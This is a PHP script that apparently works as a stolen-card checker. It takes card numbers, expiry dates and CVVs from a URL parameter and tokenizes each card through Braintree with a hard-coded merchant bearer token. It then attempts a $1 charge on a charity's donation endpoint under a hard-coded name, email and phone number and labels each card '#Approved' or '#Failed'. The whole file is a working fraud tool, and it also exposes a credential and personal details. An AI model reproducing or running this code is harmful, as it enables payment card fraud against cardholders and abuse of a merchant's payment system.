<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}



/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: payments.braintree-api.com',
   'Authorization: Bearer 1afab6230ec3fdbf9ec548846b1510488d48008068ed3aef75aa1dbf4b892f72|created_at=2019-07-28T13:21:53.763393187+0000&merchant_id=q4btq4tbyksmvjvs&public_key=jqt84zz8k75r8cx7',
   'Braintree-Version: 2018-05-10',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
'Content-Type: application/json',
'Origin: https://assets.braintreegateway.com',
'Referer: https://assets.braintreegateway.com/web/3.39.0/html/hosted-fields-frame.min.html',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"8982baa9-0c20-4948-9401-8b8a32c771be"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$pagamento = curl_exec($ch);
$token = trim(strip_tags(getstr($pagamento,'"token" : "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://actions.sumofus.org/api/payment/braintree/pages/567/transaction');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
'Origin: https://actions.sumofus.org',
'Referer: https://actions.sumofus.org/a/donate'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  'amount=1&currency=USD&recurring=false&store_in_vault=false&user%5Bname%5D=ODELL+A+FERRY&user%5Bemail%5D=judlieferry%40gmail.com&user%5Bpostal%5D=9005&user%5Bphone%5D=%2B639956272715&user%5Bcountry%5D=PH&extra_action_fields%5Baction_mv_test%5D=v1+-+29042019&payment_method_nonce='.$token.'&device_data%5Bdevice_session_id%5D=f2c2246994bec116b7640156c361c80f&device_data%5Bfraud_merchant_id%5D=600000&device_data%5Bcorrelation_id%5D=41514ac2ba55bdf6c41f02656bf379fa');
$pagamento = curl_exec($ch);
$message = trim(strip_tags(getstr($pagamento,'"message":"','"')));
if(strpos($pagamento, 'Thank you.') !== false) {
  echo '<span class="badge badge-success">#Approved</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
} else {
  echo '<span class="badge badge-danger">#Failed</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$message.'</b>';
}
?>